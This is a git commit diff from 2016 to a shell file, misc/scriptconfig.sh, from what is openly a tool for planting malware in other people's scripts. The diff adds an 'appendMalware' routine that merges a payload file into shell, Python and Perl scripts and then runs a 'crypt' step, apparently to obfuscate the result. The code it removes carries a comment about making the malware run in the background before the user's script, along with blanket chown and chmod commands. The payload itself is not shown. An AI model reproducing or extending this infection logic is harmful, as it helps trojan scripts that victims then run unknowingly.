34a5272d67a34b8bf0ff8da6922b18b1df04c661
Victory Osikwemhe <zombieleetnca@gmail.com>
2016-12-25 23:58:41 +0100

    Fix Bug in reading file

--- misc/scriptconfig.sh
+++ misc/scriptconfig.sh
@@ -1,34 +1,9 @@
 
-stripHashBang() {
-    
-    
-    local regex="$1"
-    local fileExt="${2}"
-    
-    [[ -z "$regex" ]] && {
-	printf "%s\n" "Null arguments are not allowed"
-	exit 1
-    }
-
-
-    # We read the data to and fro so that the malware
-    # will start running in the background before the users script
-    ######################################################################
-    while read fileContent;do
-	printf "%s\n" "${fileContent}" >> "${dirfile}"
-    done < "${fileName}"
-    
-    
-    sed -i "s/^#\!.*$(echo "${regex}")//g" "${dirfile}" #Striping off intereperter
-    echo "!" >> "${dirfile}"
-    
-    
-    
+appendMalware() {
     while read fileContent;do
 	printf "%s\n" "${fileContent}" >> "${fileName}"
     done < "${dirfile}"
-    #############################################################################
-    cp "${dirfile}" "${fileName}"
+    
     
     [[ "${dirfile}" != "tempScript.sh" ]] && rm "${fileName}.${fileExt}"
     
@@ -41,30 +16,26 @@ scrConfig() {
     local fileExt="${1}"
     case ${fileExt} in
     sh)
-	_sh
-	while read fileContents;do
-	    
-	    printf "%s\n" "${fileContents}" >> "${dirfile}"
-	    
-	done < "${fileName}"
-
-	cp "${dirfile}" "${fileName}"
-
-	[[ "${dirfile}" != "tempScript.sh" ]] && rm "${fileName}.${fileExt}"
+	_sh ${fileName}
 	
-	chown root:root ./*
-	chmod 775 ./*
+	appendMalware
+	
 	crypt "shell script" "${CRYPT}"
 	;;
     py)
-	_py
-	stripHashBang "python" "${fileExt}"
+	_py "${fileName}"
+	
+	appendMalware
+	
 	crypt "python script" "${CRYPT}"
 	;;
-    pl)
-	_pl
-	stripHashBang "perl" "${fileExt}"
+    pl) 
+	_pl "${fileName}"
+	
+	appendMalware
+	
 	crypt "perl script" "${CRYPT}"
 	;;
     esac
+
 }
